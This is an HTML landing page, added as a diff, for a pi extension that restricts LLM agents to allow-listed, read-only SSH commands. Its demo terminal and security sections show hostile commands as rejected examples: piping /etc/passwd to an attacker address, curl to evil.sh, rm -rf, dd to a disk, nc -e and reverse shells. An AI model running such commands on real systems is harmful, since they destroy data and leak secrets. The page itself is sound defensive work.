@@ -1,0 +1,624 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<meta name="color-scheme" content="dark" />
+<meta name="theme-color" content="#0b0d0e" />
+
+<title>pi-readonly-ssh — Safe, allow-listed SSH for LLM agents</title>
+<meta name="description" content="A pi extension that gives LLM coding agents a locked-down ssh_exec tool. Allow-listed commands, zero shell metacharacters, zero writes — audited, self-tested, read-only SSH for production boxes." />
+<meta name="keywords" content="pi, pi-coding-agent, pi extension, ssh, llm ssh, readonly ssh, allowlist, mcp ssh, ai agent ssh, remote diagnostics, secure llm tools, codingcoffee, Ameya Shenoy" />
+<meta name="author" content="Ameya Shenoy" />
+<link rel="canonical" href="https://pi-readonly-ssh.codingcoffee.dev/" />
+
+<!-- Open Graph / social -->
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="pi-readonly-ssh" />
+<meta property="og:title" content="pi-readonly-ssh — Safe, allow-listed SSH for LLM agents" />
+<meta property="og:description" content="Give your LLM an ssh_exec tool it can't misuse. Allow-listed commands, zero shell metacharacters, zero writes. Runs on any pi install." />
+<meta property="og:url" content="https://pi-readonly-ssh.codingcoffee.dev/" />
+<meta property="og:image" content="https://pi-readonly-ssh.codingcoffee.dev/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="pi-readonly-ssh — Safe, allow-listed SSH for LLM agents" />
+<meta name="twitter:description" content="Give your LLM an ssh_exec tool it can't misuse. Allow-listed, metacharacter-free, read-only SSH for pi." />
+<meta name="twitter:image" content="https://pi-readonly-ssh.codingcoffee.dev/og.png" />
+<meta name="twitter:creator" content="@codingcoffxe" />
+
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230b0d0e'/%3E%3Ctext x='50%25' y='56%25' text-anchor='middle' font-family='ui-monospace,monospace' font-size='18' fill='%23e9b949' font-weight='700'%3E%CF%80%3C/text%3E%3C/svg%3E" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "pi-readonly-ssh",
+  "description": "A pi extension exposing a locked-down ssh_exec tool to LLM coding agents. Allow-listed commands, zero shell metacharacters, zero writes.",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Linux, macOS",
+  "url": "https://pi-readonly-ssh.codingcoffee.dev/",
+  "downloadUrl": "https://www.npmjs.com/package/@codingcoffee/pi-readonly-ssh",
+  "codeRepository": "https://github.com/codingcoffee/pi-readonly-ssh",
+  "license": "https://opensource.org/licenses/MIT",
+  "author": {
+    "@type": "Person",
+    "name": "Ameya Shenoy",
+    "url": "https://codingcoffee.dev"
+  },
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
+}
+</script>
+
+<style>
+  :root {
+    --bg:        #0b0d0e;
+    --bg-elev:   #121416;
+    --bg-sink:  #08090a;
+    --panel:     #14171a;
+    --border:    #23272c;
+    --border-hi: #2f343a;
+    --fg:        #e6e7e8;
+    --fg-dim:    #a6adb4;
+    --fg-mute:   #6b7076;
+    --accent:    #e9b949;  /* warm amber — terminal-ish */
+    --accent-hi: #ffd166;
+    --ok:        #7bc97e;
+    --warn:      #e9b949;
+    --err:       #e06b6b;
+    --cyan:      #7dd3e0;
+    --mag:       #c792ea;
+    --radius:    10px;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; background: var(--bg); color: var(--fg); }
+  body {
+    font-family: "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    font-size: 16px;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+    background-image:
+      radial-gradient(1100px 520px at 85% -10%, rgba(233,185,73,0.08), transparent 60%),
+      radial-gradient(900px 420px at -10% 10%, rgba(125,211,224,0.06), transparent 60%);
+  }
+  code, pre, kbd, .mono { font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { color: var(--accent-hi); text-decoration: underline; text-underline-offset: 3px; }
+  h1, h2, h3 { letter-spacing: -0.01em; line-height: 1.2; margin: 0 0 0.5em; }
+  h1 { font-size: clamp(2rem, 4.5vw, 3.25rem); font-weight: 700; }
+  h2 { font-size: clamp(1.4rem, 2.4vw, 1.9rem); font-weight: 600; }
+  h3 { font-size: 1.1rem; font-weight: 600; }
+  p  { color: var(--fg-dim); }
+  ::selection { background: rgba(233,185,73,0.3); color: #fff; }
+
+  .wrap { max-width: 1080px; margin: 0 auto; padding: 0 1.25rem; }
+
+  /* ── Nav ── */
+  nav.top {
+    position: sticky; top: 0; z-index: 20;
+    backdrop-filter: blur(10px);
+    background: rgba(11,13,14,0.72);
+    border-bottom: 1px solid var(--border);
+  }
+  nav.top .inner {
+    display: flex; align-items: center; justify-content: space-between;
+    height: 56px;
+  }
+  nav.top .brand { display: flex; align-items: center; gap: .6rem; font-weight: 700; }
+  nav.top .brand .glyph {
+    width: 28px; height: 28px; border-radius: 6px;
+    background: linear-gradient(135deg, #1b1e22, #0d0f11);
+    border: 1px solid var(--border-hi);
+    display: grid; place-items: center;
+    color: var(--accent); font-family: "JetBrains Mono", monospace;
+  }
+  nav.top .brand small { color: var(--fg-mute); font-weight: 500; margin-left: .2rem; }
+  nav.top .links { display: flex; gap: 1.25rem; align-items: center; }
+  nav.top .links a { color: var(--fg-dim); font-size: .92rem; }
+  nav.top .links a:hover { color: var(--fg); text-decoration: none; }
+
+  /* ── Hero ── */
+  header.hero { padding: 5rem 0 3rem; }
+  .eyebrow {
+    display: inline-flex; align-items: center; gap: .55rem;
+    font-family: "JetBrains Mono", monospace;
+    font-size: .78rem; color: var(--fg-dim);
+    background: var(--bg-elev);
+    border: 1px solid var(--border);
+    padding: .4rem .7rem; border-radius: 999px;
+    margin-bottom: 1.25rem;
+  }
+  .eyebrow .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--ok); box-shadow: 0 0 10px var(--ok); }
+  header.hero h1 .accent { color: var(--accent); }
+  header.hero .sub { font-size: 1.12rem; max-width: 46rem; margin-top: 1rem; }
+  .cta { display: flex; flex-wrap: wrap; gap: .75rem; margin-top: 1.75rem; }
+  .btn {
+    display: inline-flex; align-items: center; gap: .5rem;
+    padding: .7rem 1.05rem;
+    border-radius: 8px; border: 1px solid var(--border-hi);
+    font-weight: 600; font-size: .95rem;
+    background: var(--bg-elev); color: var(--fg);
+    transition: transform .05s ease, border-color .15s ease, background .15s ease;
+  }
+  .btn:hover { text-decoration: none; border-color: var(--accent); }
+  .btn:active { transform: translateY(1px); }
+  .btn.primary { background: var(--accent); color: #1a1300; border-color: var(--accent); }
+  .btn.primary:hover { background: var(--accent-hi); border-color: var(--accent-hi); color: #1a1300; }
+  .btn svg { width: 16px; height: 16px; }
+
+  .badges { display: flex; flex-wrap: wrap; gap: .5rem; margin-top: 1.5rem; }
+  .badge {
+    font-family: "JetBrains Mono", monospace; font-size: .75rem;
+    background: var(--bg-elev); border: 1px solid var(--border);
+    color: var(--fg-dim);
+    padding: .3rem .6rem; border-radius: 6px;
+  }
+  .badge b { color: var(--fg); font-weight: 600; }
+
+  /* ── Terminal mock ── */
+  .term {
+    margin-top: 2.5rem;
+    background: var(--bg-sink);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    box-shadow: 0 20px 60px -20px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.02) inset;
+  }
+  .term .bar {
+    display: flex; align-items: center; gap: .5rem;
+    padding: .55rem .75rem;
+    background: linear-gradient(180deg, #16191c, #111315);
+    border-bottom: 1px solid var(--border);
+  }
+  .term .bar .dotrow { display: flex; gap: .35rem; }
+  .term .bar .d { width: 11px; height: 11px; border-radius: 50%; background: #2a2d31; }
+  .term .bar .d.r { background: #e06b6b; }
+  .term .bar .d.y { background: #e9b949; }
+  .term .bar .d.g { background: #7bc97e; }
+  .term .bar .title {
+    font-family: "JetBrains Mono", monospace; font-size: .8rem;
+    color: var(--fg-mute); margin-left: .6rem;
+  }
+  .term pre {
+    margin: 0; padding: 1rem 1.1rem;
+    font-size: .88rem; line-height: 1.65;
+    color: var(--fg);
+    overflow-x: auto;
+  }
+  .term .p  { color: var(--accent); }    /* prompt */
+  .term .c  { color: var(--fg); }        /* command */
+  .term .o  { color: var(--fg-dim); }    /* output */
+  .term .ok { color: var(--ok); }
+  .term .er { color: var(--err); }
+  .term .cy { color: var(--cyan); }
+  .term .mg { color: var(--mag); }
+  .term .mu { color: var(--fg-mute); }
+  .term .kw { color: var(--accent); font-weight: 600; }
+
+  /* ── Sections ── */
+  section { padding: 4rem 0; border-top: 1px solid var(--border); }
+  section .lead { max-width: 46rem; margin-bottom: 2rem; }
+
+  /* ── Feature grid ── */
+  .grid {
+    display: grid; gap: 1rem;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  }
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 1.25rem 1.25rem 1.1rem;
+    transition: border-color .15s ease, transform .15s ease;
+  }
+  .card:hover { border-color: var(--border-hi); }
+  .card .ico {
+    width: 34px; height: 34px; border-radius: 8px;
+    display: grid; place-items: center;
+    background: rgba(233,185,73,0.08); color: var(--accent);
+    border: 1px solid rgba(233,185,73,0.18);
+    margin-bottom: .85rem; font-family: "JetBrains Mono", monospace; font-weight: 700;
+  }
+  .card h3 { color: var(--fg); margin-bottom: .35rem; }
+  .card p  { font-size: .94rem; margin: 0; color: var(--fg-dim); }
+
+  /* ── Code block ── */
+  .codeblock {
+    position: relative;
+    background: var(--bg-sink);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .codeblock .tag {
+    position: absolute; top: .55rem; right: .7rem;
+    font-family: "JetBrains Mono", monospace; font-size: .7rem;
+    color: var(--fg-mute); text-transform: uppercase; letter-spacing: .1em;
+  }
+  .codeblock pre {
+    margin: 0; padding: 1rem 1.1rem;
+    font-size: .88rem; line-height: 1.6; overflow-x: auto;
+  }
+  .codeblock .k  { color: var(--accent); }
+  .codeblock .s  { color: var(--ok); }
+  .codeblock .n  { color: var(--cyan); }
+  .codeblock .co { color: var(--fg-mute); font-style: italic; }
+
+  .two-col {
+    display: grid; gap: 1.25rem;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    align-items: start;
+  }
+
+  /* ── Callouts ── */
+  .callout {
+    border-left: 3px solid var(--accent);
+    background: linear-gradient(90deg, rgba(233,185,73,0.06), transparent);
+    padding: 1rem 1.15rem;
+    border-radius: 0 var(--radius) var(--radius) 0;
+    color: var(--fg-dim);
+  }
+  .callout b { color: var(--fg); }
+
+  /* ── Stats strip ── */
+  .stats {
+    display: grid; gap: 1rem;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    margin-top: 2rem;
+  }
+  .stat {
+    background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius);
+    padding: 1.1rem 1.2rem;
+  }
+  .stat .n { font-family: "JetBrains Mono", monospace; font-size: 1.8rem; font-weight: 700; color: var(--accent); }
+  .stat .l { color: var(--fg-dim); font-size: .9rem; margin-top: .15rem; }
+
+  /* ── Footer ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2.5rem 0 3rem;
+    color: var(--fg-mute);
+    font-size: .9rem;
+  }
+  footer .row { display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center; }
+  footer a { color: var(--fg-dim); }
+  footer a:hover { color: var(--accent); }
+  footer .links { display: flex; gap: 1.2rem; flex-wrap: wrap; }
+
+  @media (max-width: 640px) {
+    header.hero { padding: 3rem 0 2rem; }
+    nav.top .links a:not(.ghbtn) { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<nav class="top">
+  <div class="wrap inner">
+    <a href="/" class="brand" aria-label="pi-readonly-ssh home">
+      <span class="glyph">π</span>
+      <span>pi-readonly-ssh <small>/ extension</small></span>
+    </a>
+    <div class="links">
+      <a href="#features">Features</a>
+      <a href="#install">Install</a>
+      <a href="#config">Config</a>
+      <a href="#security">Security</a>
+      <a class="ghbtn" href="https://github.com/codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">GitHub →</a>
+    </div>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="wrap">
+    <span class="eyebrow"><span class="dot"></span>pi extension · v0.2.0 · MIT</span>
+    <h1>Give your LLM an <span class="accent">ssh_exec</span> tool<br/>it <em>can't</em> misuse.</h1>
+    <p class="sub">
+      <b style="color:var(--fg)">pi-readonly-ssh</b> is a
+      <a href="https://github.com/mariozechner/pi" target="_blank" rel="noopener">pi</a> extension that lets your coding agent poke at
+      production boxes over SSH — but only through a strict, allow-listed set of
+      read-only commands. No pipes. No redirects. No shell. No writes. Ever.
+    </p>
+
+    <div class="cta">
+      <a class="btn primary" href="https://github.com/codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">
+        <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 .2a8 8 0 0 0-2.53 15.6c.4.07.55-.17.55-.38v-1.5c-2.23.48-2.7-.95-2.7-.95-.36-.92-.89-1.17-.89-1.17-.73-.5.05-.49.05-.49.8.06 1.23.83 1.23.83.72 1.22 1.87.87 2.33.67.07-.52.28-.88.5-1.08-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.22 2.2.82a7.6 7.6 0 0 1 4 0c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.28.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.24.54.73.54 1.47v2.18c0 .21.15.46.55.38A8 8 0 0 0 8 .2"/></svg>
+        View on GitHub
+      </a>
+      <a class="btn" href="https://www.npmjs.com/package/@codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">
+        <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M0 0h16v16H0zM3 3v10h5V5h3v8h2V3z" fill="#cb3837"/></svg>
+        npm package
+      </a>
+      <a class="btn" href="#install">Quick install ↓</a>
+    </div>
+
+    <div class="badges" aria-label="at a glance">
+      <span class="badge">✓ <b>~140</b> self-tests on every load</span>
+      <span class="badge">✓ <b>0</b> shell metacharacters allowed</span>
+      <span class="badge">✓ <b>96</b> read-only commands shipped</span>
+      <span class="badge">✓ strict-mode disables pi's <code>bash</code></span>
+    </div>
+
+    <div class="term" aria-label="example session">
+      <div class="bar">
+        <div class="dotrow"><span class="d r"></span><span class="d y"></span><span class="d g"></span></div>
+        <span class="title">~ pi  —  ssh_exec demo</span>
+      </div>
+<pre><span class="mu">// LLM asks to investigate a flaky nginx on prod-web-1</span>
+<span class="p">▶</span> <span class="c">ssh_exec(host=<span class="cy">"prod-web-1"</span>, command=<span class="cy">"systemctl status nginx"</span>)</span>
+<span class="o">  ● nginx.service - A high performance web server
+       Active: <span class="ok">active (running)</span> since Sat 2026-04-18 21:03:11 UTC
+       Tasks: 9 (limit: 4915)</span>
+
+<span class="p">▶</span> <span class="c">ssh_exec(host=<span class="cy">"prod-web-1"</span>, command=<span class="cy">"tail -n 50 /var/log/nginx/error.log"</span>)</span>
+<span class="o">  2026/04/18 21:04:02 [error] 1823#1823: upstream timed out ...</span>
+
+<span class="p">▶</span> <span class="c">ssh_exec(host=<span class="cy">"prod-web-1"</span>, command=<span class="cy">"sudo rm -rf /var/log"</span>)</span>
+<span class="er">  ✗ rejected: command 'rm' is not in the allowlist</span>
+
+<span class="p">▶</span> <span class="c">ssh_exec(host=<span class="cy">"prod-web-1"</span>, command=<span class="cy">"cat /etc/passwd | mail attacker@x"</span>)</span>
+<span class="er">  ✗ rejected: pipe '|' is not allowed; ssh_exec does not run shell pipelines</span>
+
+<span class="p">▶</span> <span class="c">ssh_exec(host=<span class="cy">"prod-web-1"</span>, command=<span class="cy">"echo $(curl evil.sh)"</span>)</span>
+<span class="er">  ✗ rejected: command substitution '$(' is not allowed</span>
+</pre>
+    </div>
+  </div>
+</header>
+
+<section id="why">
+  <div class="wrap">
+    <h2>Why this exists</h2>
+    <p class="lead">
+      LLM agents are great at reading logs, tailing metrics, and poking at running
+      systems. They're also one runaway tool-call away from <code>rm -rf /</code>.
+      Giving an agent raw SSH means trusting every future model revision,
+      every prompt-injection payload, every hallucinated flag. <b style="color:var(--fg)">pi-readonly-ssh</b>
+      removes the trust requirement: the <em>validator</em>, not the model, decides what runs.
+    </p>
+
+    <div class="stats" role="list">
+      <div class="stat" role="listitem">
+        <div class="n">140+</div>
+        <div class="l">dangerous patterns tested on every startup</div>
+      </div>
+      <div class="stat" role="listitem">
+        <div class="n">0</div>
+        <div class="l">shell, pipes, redirects, or substitutions allowed</div>
+      </div>
+      <div class="stat" role="listitem">
+        <div class="n">2-pass</div>
+        <div class="l">raw-string scan + argv parse before SSH</div>
+      </div>
+      <div class="stat" role="listitem">
+        <div class="n">YAML</div>
+        <div class="l">single file, hot-reloadable via <code>/ssh-reload</code></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="features">
+  <div class="wrap">
+    <h2>What you get</h2>
+    <p class="lead">Every knob the agent can't turn is a class of incident that can't happen.</p>
+
+    <div class="grid">
+      <div class="card">
+        <div class="ico">AL</div>
+        <h3>Allow-list first</h3>
+        <p>Only commands present in <code>commands.yaml</code> can execute. Per-command <code>subcommands</code>, <code>banned_flags</code>, <code>banned_args_regex</code>, and <code>max_args</code>.</p>
+      </div>
+      <div class="card">
+        <div class="ico">NM</div>
+        <h3>No metacharacters</h3>
+        <p>Pipes, redirects, <code>&amp;&amp;</code>, <code>;</code>, backticks, <code>$(…)</code>, heredocs, newlines — all rejected at the raw string level, before parsing.</p>
+      </div>
+      <div class="card">
+        <div class="ico">NH</div>
+        <h3>Named hosts only</h3>
+        <p>Hosts live in YAML with a friendly alias. Optional <code>allow_any_host</code> for dev; off by default.</p>
+      </div>
+      <div class="card">
+        <div class="ico">ST</div>
+        <h3>Strict mode</h3>
+        <p>Disables pi's built-in <code>bash</code> tool while the extension is loaded — otherwise the LLM could just shell out and bypass everything.</p>
+      </div>
+      <div class="card">
+        <div class="ico">ST</div>
+        <h3>Self-tested on load</h3>
+        <p>~140 destructive patterns (<code>rm&nbsp;-rf&nbsp;/</code>, <code>dd&nbsp;of=/dev/sda</code>, <code>curl&nbsp;|&nbsp;sh</code>, reverse shells, nested <code>ssh</code>…) must stay rejected. Config regressions are loud.</p>
+      </div>
+      <div class="card">
+        <div class="ico">TL</div>
+        <h3>Timeouts &amp; output caps</h3>
+        <p>Per-call timeout and a hard ceiling on bytes returned — no agent can accidentally <code>cat</code> a 4&nbsp;GB log into your context window.</p>
+      </div>
+      <div class="card">
+        <div class="ico">AU</div>
+        <h3>Audit log</h3>
+        <p>Every attempted call — accepted or rejected, with reason — appended to a single file you control. Forensics, always.</p>
+      </div>
+      <div class="card">
+        <div class="ico">HR</div>
+        <h3>Hot reload</h3>
+        <p><code>/ssh-reload</code> picks up YAML edits without restarting pi. Tighten the policy live.</p>
+      </div>
+      <div class="card">
+        <div class="ico">π</div>
+        <h3>Pure pi extension</h3>
+        <p>Installs via <code>pi install</code>. No daemons, no services, no new attack surface — just a tool the agent can call.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="install">
+  <div class="wrap">
+    <h2>Install</h2>
+    <p class="lead">Works on any machine with <a href="https://github.com/mariozechner/pi" target="_blank" rel="noopener">pi</a> installed. You don't need <code>npm</code> or <code>node</code> on your <code>PATH</code>; pi manages it.</p>
+
+    <div class="two-col">
+      <div class="codeblock">
+        <span class="tag">from npm (recommended)</span>
+<pre><span class="co"># install globally into pi</span>
+<span class="k">pi</span> install npm:@codingcoffee/pi-readonly-ssh
+
+<span class="co"># verify</span>
+<span class="k">pi</span> list
+<span class="k">pi</span>  <span class="co"># look for "ro-ssh: N cmds, ..." in the footer</span></pre>
+      </div>
+
+      <div class="codeblock">
+        <span class="tag">from git (no npm)</span>
+<pre><span class="k">pi</span> install git:github.com/codingcoffee/pi-readonly-ssh
+
+<span class="co"># or pinned to a release tag</span>
+<span class="k">pi</span> install git:github.com/codingcoffee/pi-readonly-ssh<span class="n">@v0.2.0</span>
+
+<span class="co"># try without installing</span>
+<span class="k">pi</span> -e npm:@codingcoffee/pi-readonly-ssh</pre>
+      </div>
+    </div>
+
+    <p class="lead" style="margin-top:1.5rem">
+      Inside pi, try <code>/ssh-allowed</code> to list the allowlisted commands
+      and <code>/ssh-hosts</code> to list your named hosts.
+    </p>
+  </div>
+</section>
+
+<section id="config">
+  <div class="wrap">
+    <h2>One YAML, one source of truth</h2>
+    <p class="lead">
+      The full policy — hosts, commands, timeouts, strict mode, audit log —
+      lives in a single <code>commands.yaml</code>. Edit it, run
+      <code>/ssh-reload</code>, done.
+    </p>
+
+    <p class="lead">
+      The extension ships with sensible defaults baked into the installed
+      package. To customize, drop your own copy at
+      <code>~/.config/pi-readonly-ssh/commands.yaml</code> — or a
+      project-local <code>./.pi/readonly-ssh/commands.yaml</code> next to your
+      repo to share policy with your team. The first file found in that order
+      wins; otherwise the bundled default is used read-only.
+    </p>
+
+    <div class="codeblock">
+      <span class="tag">~/.config/pi-readonly-ssh/commands.yaml</span>
+<pre><span class="k">settings</span>:
+  <span class="k">strict_mode</span>: <span class="n">true</span>           <span class="co"># disable pi's built-in bash tool</span>
+  <span class="k">max_output_bytes</span>: <span class="n">262144</span>
+  <span class="k">default_timeout_sec</span>: <span class="n">20</span>
+  <span class="k">allow_any_host</span>: <span class="n">false</span>
+  <span class="k">audit_log</span>: <span class="s">"~/.local/state/pi/readonly-ssh/audit.log"</span>
+
+<span class="k">hosts</span>:
+  - { <span class="k">name</span>: <span class="s">prod-web-1</span>,  <span class="k">ssh</span>: <span class="s">"deploy@10.0.1.11"</span> }
+  - { <span class="k">name</span>: <span class="s">prod-db-1</span>,   <span class="k">ssh</span>: <span class="s">"ops@db-primary.internal"</span> }
+
+<span class="k">commands</span>:
+  - { <span class="k">name</span>: <span class="s">ls</span> }
+  - { <span class="k">name</span>: <span class="s">cat</span> }
+  - { <span class="k">name</span>: <span class="s">grep</span>,        <span class="k">banned_flags</span>: [<span class="s">"-Z"</span>, <span class="s">"--null"</span>] }
+  - { <span class="k">name</span>: <span class="s">tail</span>,        <span class="k">banned_flags</span>: [<span class="s">"-f"</span>, <span class="s">"--follow"</span>] }
+  - { <span class="k">name</span>: <span class="s">systemctl</span>,   <span class="k">subcommands</span>: [<span class="s">status</span>, <span class="s">is-active</span>, <span class="s">show</span>, <span class="s">list-units</span>] }
+  - { <span class="k">name</span>: <span class="s">journalctl</span>,  <span class="k">banned_flags</span>: [<span class="s">"-f"</span>, <span class="s">"--follow"</span>] }
+  - { <span class="k">name</span>: <span class="s">kubectl</span>,     <span class="k">subcommands</span>: [<span class="s">get</span>, <span class="s">describe</span>, <span class="s">logs</span>, <span class="s">top</span>] }
+  <span class="co"># ...and 90+ more shipped by default</span></pre>
+    </div>
+
+    <div class="callout" style="margin-top:1.5rem">
+      <b>Fat-finger your YAML? You'll know immediately.</b> On every pi startup
+      (and on every <code>/ssh-reload</code>) the extension runs ~140 must-reject
+      self-tests against your live config — <code>rm&nbsp;-rf&nbsp;/</code>,
+      <code>curl&nbsp;|&nbsp;sh</code>, <code>dd&nbsp;of=/dev/sda</code>, reverse
+      shells, nested <code>ssh</code>, and more. If a careless edit starts
+      letting any of them through, pi surfaces a warning in the footer
+      <em>before</em> the agent makes its first tool call. Break the policy and
+      you find out in seconds, not incidents.
+    </div>
+  </div>
+</section>
+
+<section id="security">
+  <div class="wrap">
+    <h2>Security model</h2>
+    <p class="lead">
+      <b style="color:var(--fg)">Explicit approval, never implicit allow.</b>
+      Every command, subcommand, flag, and host must be named in your YAML to
+      run. If it isn't on the list, it's rejected — there is no “probably
+      safe”, no heuristic, no sandbox to escape. The default state is
+      <em>no</em>.
+    </p>
+    <p class="lead">Two layers of validation run before the string ever reaches <code>ssh</code>:</p>
+
+    <div class="two-col">
+      <div class="card">
+        <h3>1 · Raw-string scan</h3>
+        <p>
+          Before <em>any</em> parsing, the input is checked for forbidden bytes:
+          <code>|</code>, <code>&amp;</code>, <code>;</code>, <code>&gt;</code>, <code>&lt;</code>,
+          backticks, <code>$(</code>, <code>${</code>, <code>&lt;(</code>, <code>&lt;&lt;</code>,
+          newlines, CRs. Zero tolerance — quoted or not.
+        </p>
+      </div>
+      <div class="card">
+        <h3>2 · Argv validation</h3>
+        <p>
+          The string is parsed with <code>shell-quote</code> into an argv. Any
+          non-string token (operators, globs-as-AST, comments) is rejected. The
+          head is matched against the allowlist; <code>sudo</code> is validated
+          recursively on its inner command.
+        </p>
+      </div>
+    </div>
+
+    <div class="callout" style="margin-top:1.5rem">
+      <b>Self-test on every load.</b> The extension ships with a battery of
+      ~140 must-reject patterns — <code>rm&nbsp;-rf&nbsp;/</code>,
+      <code>dd&nbsp;of=/dev/sda</code>, <code>curl&nbsp;|&nbsp;sh</code>,
+      <code>nc&nbsp;-e</code>, <code>kubectl&nbsp;delete</code>,
+      <code>git&nbsp;push&nbsp;--force</code>, nested <code>ssh</code>,
+      heredocs, process substitution, <code>python&nbsp;-c</code>,
+      <code>eval</code> — that run against your live config on startup and on
+      <code>/ssh-reload</code>. If you trim or edit the policy in a way that
+      lets any of them through, you get a warning <em>before</em> the agent
+      makes its first tool call.
+    </div>
+  </div>
+</section>
+
+<section id="cta">
+  <div class="wrap" style="text-align:center">
+    <h2>Read-only SSH for agents, in one command.</h2>
+    <p class="lead" style="margin:.5rem auto 1.5rem">Ship the policy with your repo. Let the model read prod — and nothing else.</p>
+    <div class="cta" style="justify-content:center">
+      <a class="btn primary" href="https://github.com/codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">Get it on GitHub</a>
+      <a class="btn" href="https://www.npmjs.com/package/@codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">View on npm</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap row">
+    <div>
+      © 2026 pi-readonly-ssh · Crafted by <a href="https://codingcoffee.dev" target="_blank" rel="noopener author">Ameya Shenoy</a>
+    </div>
+    <div class="links">
+      <a href="https://github.com/codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://www.npmjs.com/package/@codingcoffee/pi-readonly-ssh" target="_blank" rel="noopener">npm</a>
+      <a href="https://github.com/mariozechner/pi" target="_blank" rel="noopener">pi</a>
+      <a href="https://github.com/codingcoffee/pi-readonly-ssh/blob/main/LICENSE" target="_blank" rel="noopener">MIT License</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
